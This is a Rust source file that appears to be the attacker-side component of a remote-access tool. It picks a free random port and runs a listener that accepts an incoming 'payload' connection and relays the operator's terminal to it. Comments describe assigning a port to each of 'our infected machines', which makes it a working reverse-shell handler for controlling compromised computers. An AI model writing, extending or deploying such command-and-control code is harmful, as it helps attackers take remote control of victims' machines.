use std::net::TcpListener;
use std::io::{stdin, stdout, Read, Write};
use std::thread::{JoinHandle, spawn};
use rand::Rng;

// Let's create a function that will check if a specific tcp port is
// available
pub fn is_port_available(port: u16) -> bool {
    // We create a TcpListener to the specific port
    match TcpListener::bind(("127.0.0.1", port)) {
        // If it returns ok when creating the listener it means
        // that the port is available if not we return false
        Ok(_) => true,
        Err(_) => false,
    }
}

// Now let's create a function that will return a random port from
// a specific range
pub fn get_available_port(min: u16, max: u16) -> u16 {
    // Let's create the generator
    let mut rng = rand::thread_rng();
    // We generate a first random port
    let mut port: u16 = rng.gen_range(min..max);
    // If it's not a usable one we loop until we found a correct port
    while !is_port_available(port) {
        port = rng.gen_range(min..max);
    }

    // We then return the correct port
    return port;
}

// This function will be used for the incoming connections from the payload
// it is used to separate in 2 different threads the input and the output
// so our connection in bidirectional
fn pipe_thread<R, W>(mut read: R, mut write: W) -> JoinHandle<()> 
    where R: Read + Send + 'static,
          W: Write + Send + 'static {

    // Create a new thread and capture the ownership of the
    // `Read` and `Write` objects
    spawn(move || {
        let mut buffer = [0; 1024];
        // Get the infos from the input and write it to the output
        // buffer
        loop {
            let len = read.read(&mut buffer).unwrap();
            // If there is no more input then just break the loop
            if len == 0 {
                break;
            }
            // Write the output buffer and then flush it for the new
            // inputs
            write.write(&buffer[..len]).unwrap();
            write.flush().unwrap();
        }
    })
}

// This is a simple function that will create a TcpListener for our incoming
// payload connections. It takes a port in argument so we can assign a specific port
// for each of our infected machines
pub fn listen(port: u16) {
    // Create the listener and bind it to 0.0.0.0 and the specified port
    let tcp_connection = TcpListener::bind(("0.0.0.0", port)).unwrap();
    // Let's get the stream
    let (stream, _) = tcp_connection.accept().unwrap();
    // Create a specific thread for the input and output
    let input = pipe_thread(stdin(), stream.try_clone().unwrap()); // Clone the stream
    let output = pipe_thread(stream, stdout()); // Just used to write to stdout
    // Now we just wait for the two threads to finish
    let _ = input.join();
    let _ = output.join();
}
